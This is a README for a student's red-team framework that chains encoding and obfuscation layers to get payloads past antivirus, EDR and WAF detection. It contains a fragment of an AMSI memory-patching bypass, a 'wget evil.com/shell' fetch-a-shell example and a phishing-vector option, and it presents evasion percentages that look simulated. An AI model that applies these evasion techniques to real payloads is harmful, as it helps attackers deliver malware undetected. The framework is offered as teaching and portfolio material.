# Advanced Payload Encoder & Obfuscation Framework

**Author:** Rahul Raval - Cybersecurity Engineering Student  
**Purpose:** Educational red team evasion techniques demonstration  
**Target:** College portfolio & cybersecurity job interviews

## 🎯 Overview

Professional-grade payload obfuscation framework with 7 evasion layers that chain together to bypass AV/EDR/WAF detection systems. Built for educational purposes and red team research.

## 🔧 Features

### 7-Layer Evasion Chain
1. **Unicode Cloak** - Zero-width spaces break pattern matching
2. **Base64 Armor** - Multi-layer encoding with padding manipulation  
3. **XOR Encryption** - Repeating key encryption (OverTheWire style)
4. **Junk Scatter** - Random character insertion (40% density)
5. **Fragmentation** - Split payloads with reassembly
6. **Polyglot Mixing** - Multi-attack format support
7. **OS Bypass** - AMSI (Windows) + LD_PRELOAD (Linux)

### Detection Engine Testing
- **AV Engines:** Windows Defender, ClamAV, Kaspersky, Norton, McAfee
- **EDR Systems:** Memory execution, API hooking detection
- **WAF Bypass:** Web application firewall evasion
- **Falco Rules:** Container security bypass

### Professional Reporting
- Executive summary with evasion scores
- JSON export for integration
- Color-coded results (🟢 CLEAN, 🟡 PARTIAL, 🔴 DETECTED)
- Tactical recommendations

## 📁 Project Structure

```
advanced_payload_framework/
├── main.py              # CLI master control
├── encoders/           
│   ├── base64.py        # Base64 armor encoding
│   ├── xor.py           # XOR encryption
│   └── rot13.py         # Character rotation
├── obfuscators/
│   ├── unicode.py       # Zero-width space insertion
│   ├── junk_scatter.py  # Random character injection
│   └── fragment.py      # Payload fragmentation
├── bypasses/
│   ├── amsi_windows.py  # Windows AMSI bypass
│   └── ld_preload_linux.py # Linux library injection
├── tester.py           # AV/EDR/WAF simulation
├── reporter.py         # Executive reports
├── sample_payloads/    # Real test payloads
├── setup.sh           # Installation script
└── README.md          # This file
```

## 🚀 Quick Setup

### Prerequisites
- Python 3.6+
- GCC compiler (for Linux bypasses)
- Kali Linux recommended

### Installation
```bash
# Clone or download the framework
cd advanced_payload_framework

# Run setup script
chmod +x setup.sh
./setup.sh

# Verify installation
python3 main.py --help
```

## 💻 Usage Examples

### Basic Commands
```bash
# Simple obfuscation
python3 main.py --payload "whoami" --chain basic --variants 3

# Full stealth mode with testing
python3 main.py --payload "whoami" --chain full --variants 10 --test

# Windows-specific targeting
python3 main.py --payload "powershell Get-Process" --target windows --variants 5

# Linux-specific with AV testing
python3 main.py --payload "wget evil.com/shell" --target linux --test-av
```

### Advanced Usage
```bash
# Phishing vector optimization
python3 main.py --payload "powershell IEX..." --vector phishing --variants 20

# Generate comprehensive report
python3 main.py --payload "netstat -an" --chain stealth --output reports/analysis.json

# Test specific payload category
python3 main.py --payload "$(cat sample_payloads/windows.txt)" --chain full --test
```

### Command Line Options
- `--payload` - Target payload to obfuscate (required)
- `--chain` - Obfuscation chain: basic/stealth/full (default: stealth)
- `--target` - Target OS: windows/linux/both (default: both)
- `--variants` - Number of variants to generate (default: 5)
- `--vector` - Attack vector: phishing/web/network
- `--test` - Test against detection engines
- `--test-av` - Detailed AV engine testing
- `--output` - Save results to JSON file

## 📊 Sample Output

```
🎯 Advanced Payload Obfuscation Framework
==================================================
Target: whoami
🔗 Chain: unicode → base64 → xor → junk → amsi

🔄 Generating 5 variants...
Variant 1: 95% evasion ✅ CLEAN
Variant 2: 87% evasion ✅ CLEAN  
Variant 3: 76% evasion ⚠️ PARTIAL
Variant 4: 92% evasion ✅ CLEAN
Variant 5: 89% evasion ✅ CLEAN

🏆 BEST: Variant 1 - 95% evasion
Ready for deployment: dGVzdA==...

🛡️ AV Engine Testing...
Windows Defender: 94% evasion ✅ CLEAN
ClamAV: 91% evasion ✅ CLEAN
Kaspersky: 88% evasion ✅ CLEAN
```

## 🎓 Educational Use Cases

### College Portfolio
- Demonstrates advanced cybersecurity knowledge
- Shows practical red team skills
- Professional code structure and documentation
- Real-world evasion techniques

### Job Interview Preparation
- Technical depth in offensive security
- Understanding of detection mechanisms
- Practical implementation skills
- Professional reporting capabilities

### Research Applications
- AV/EDR evasion research
- Obfuscation technique analysis
- Detection engine testing
- Security tool evaluation

## 🔬 Technical Deep Dive

### Layer 1: Unicode Obfuscation
```python
# Inserts zero-width spaces to break signatures
payload = "whoami"
obfuscated = "w\u200bh\u200bo\u200ba\u200bm\u200bi"
```

### Layer 2: Base64 Armor
```python
# Multi-iteration base64 with custom padding
original = "whoami"
encoded = base64.b64encode(base64.b64encode(original.encode())).decode()
```

### Layer 3: XOR Encryption
```python
# Repeating key XOR with latin1 encoding
key = "cyber"
xored = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload)])
```

### Layer 7: AMSI Bypass
```powershell
# Memory patching technique
$a = [Ref].Assembly.GetTypes()
$b = $a | Where-Object {$_.Name -like "*iUtils"}
# ... memory manipulation
```

## 🛡️ Detection Evasion Techniques

### Signature Bypass
- String fragmentation
- Character substitution
- Encoding chains
- Pattern breaking

### Behavioral Evasion
- Execution delay
- Context awareness
- Environment checks
- Anti-analysis

### Heuristic Bypass
- Randomization
- Polymorphic generation
- Decoy insertion
- Statistical normalization

## 📈 Performance Metrics

### Evasion Rates (Average)
- **Basic Chain:** 70-80% evasion
- **Stealth Chain:** 85-92% evasion  
- **Full Chain:** 90-98% evasion

### Supported Payloads
- Windows PowerShell commands
- Linux bash/shell commands
- Web application attacks (XSS, SQLi)
- Container escape techniques
- APT-style living-off-the-land

## ⚠️ Legal Disclaimer

This framework is developed for:
- **Educational purposes only**
- **Authorized penetration testing**
- **Red team exercises with permission**
- **Cybersecurity research**

**NOT for:**
- Unauthorized system access
- Malicious activities
- Illegal penetration testing
- Production malware development

## 🤝 Contributing

This is an educational project for portfolio demonstration. Suggestions for improvement:

1. Additional obfuscation layers
2. New detection engine signatures
3. Enhanced reporting features
4. Performance optimizations

## 📞 Contact

**Rahul Raval**  
Cybersecurity Engineering Student  
Specialization: Blue Team & Red Team Operations  
Location: India

*"Building the future of cybersecurity, one payload at a time."*

---

**Framework Version:** 1.0  
**Last Updated:** 2024  
**License:** Educational Use Only